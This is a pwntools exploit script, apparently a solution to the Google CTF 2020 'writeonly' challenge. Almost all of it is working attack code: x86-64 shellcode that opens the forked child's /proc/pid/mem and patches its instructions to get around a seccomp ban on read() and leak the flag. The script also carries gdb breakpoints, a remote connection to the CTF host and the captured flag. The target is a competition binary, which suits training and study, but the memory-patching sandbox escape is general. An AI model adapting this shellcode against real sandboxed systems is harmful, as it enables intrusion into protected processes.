#!/usr/bin/env python
from pwn import *

context.update(arch='amd64')
exe = './chal'

'''
This sandbox executes any shellcode you send. But thanks to seccomp, you won't be able to read /home/user/flag.

Process forks()

child => while loop: open and read 4 bytes of the flag
parent => inits seccomp rules which disallow read() syscall 
         and gets 4096 bytes of user input to run as shellcode

0x00000000004b4000 0x00000000004d4000 0x00000000000b3000 rw- /home/pen/Downloads/googlectf20/sandbox/writeonly/chal
0x00000000004d4000 0x00000000004d6000 0x0000000000000000 rw-

remote leaks the child pid, so we can open(/proc/pid/mem) and patch over the child code that is reading the flag
[DEBUG] child pid: 2
'''

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('writeonly.2020.ctfcompetition.com', 1337)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
#set follow-fork-mode parent
set follow-fork-mode child
# call read in child
b * 0x00402281
# call __fork
b * 0x004022f7
# call rax - run shellcode in child
b * 0x00402354
continue
'''.format(**locals())

# http://blog.redrocket.club/2019/04/11/midnightsunctf-quals-2019-gissa2/
# ^ Attempt to set bit 30 of the syscall number to access the 'x32' syscall ABI FAILED
#   because of the rule if (A < 0x40000000) check
def generate_shellcode(child_pid):
    # open('/proc/child_pid/mem', O_RDWR=0x02, 0)

    # patch 0x00402273 mov edx, 0x04 => mov edx, bigger_num
    # ba 04 00 00 00 => ba ff 00 00 00
    # lseek(flag_fd, 0x00402273, SEEK_SET=0x00)
    # write(flag_fd, src=0x402266, 1)

    # patch 0x00402287 lea rsi, [data_48a0b1] => lea rsi, [rbp - 8]; nop ; nop; nop
    # 48 8d 35 23 7e 08 00 => 48 8d 75 f8 90 90 90 
    # lseek(flag_fd, 0x00402289, SEEK_SET=0x00)
    # write(flag_fd, src= , 5)

    sc_str = """
        jmp get_path_str;
    ret_path:
        pop rdi;
        mov rsi, 0x02;
        xor rdx, rdx;
        mov rax, 0x02;
        syscall;

    save_fd:
        mov r10, rax;

    lseek_1:
        xor rdx, rdx;
        mov rdi, rax;
        mov rsi, 0x00402273;
        mov rax, 0x08;
        syscall;

    write_1:
        mov rdi, r10;
        mov rsi, 0x402266;
        mov rdx, 0x01;
        mov rax, 0x01;
        syscall;

    lseek_2:
        xor rdx, rdx;
        mov rdi, r10;
        mov rsi, 0x00402289;
        mov rax, 0x08;
        syscall;

    write_2:
        jmp last_patch
    ret_last:
        pop rsi;
        mov rdi, r10;
        mov rax, 0x01;
        mov rdx, 0x05;
        syscall;

    get_path_str:
        call ret_path
        .string "/proc/%s/mem"

    last_patch:
        call ret_last
    """ % child_pid.decode('utf-8')

    sc = asm(sc_str)
    sc += b"\x75\xf8\x90\x90\x90"

    print(disasm(sc))
    return sc

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
io = start()
debug_prompt = io.recvline()
child_pid = debug_prompt.split(b" ")[-1].rstrip()

log.info(f"child pid = {child_pid}")

shellcode = generate_shellcode(child_pid)
shellcode_len = len(shellcode)

io.recvuntil("shellcode length?")
io.sendline(str(shellcode_len))

io.recvuntil("of shellcode.")
io.sendline(shellcode)

io.interactive()

# CTF{why_read_when_you_can_write}

